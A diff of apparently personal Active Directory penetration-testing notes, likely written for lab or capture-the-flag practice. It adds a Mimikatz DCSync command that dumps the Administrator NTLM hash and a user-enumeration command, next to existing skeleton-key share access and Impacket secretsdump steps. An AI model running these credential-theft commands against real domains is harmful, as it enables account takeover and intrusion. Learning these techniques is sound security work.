@@ -3,6 +3,10 @@
   2. You can search the hash using hashcat https://hashcat.net/wiki/doku.php?id=example_hashes 
   3. grep -i (ignore case helpful when searching output for password or hashes)
 
+# Useful #
+1. Get active logged on users
+	a. Get-NetLoggedon -ComputerName clientXYZ
+2. In 2.05 remember it looks up service principal name and you find iis and hostname for a webserver. 
 
 # LDAP #
 1. Basic Search
@@ -102,7 +106,15 @@
 			The default credentials will be: "mimikatz"			
 			example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password			
       example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1!
-# Secrets Dump #
+
+	
+5. Mimikatz Domain Controller Synchronization
+	
+	a. lsadump::dcsync /user:Administrator
+	You will get the NTLM hash
+	
+	
+	# Secrets Dump #
 1. Impacket Secrets Dump if you have creds of admin or backup account
 	
   a. sudo python3 /opt/impacket/examples/secretsdump.py controller.local/admin:password@controller.local
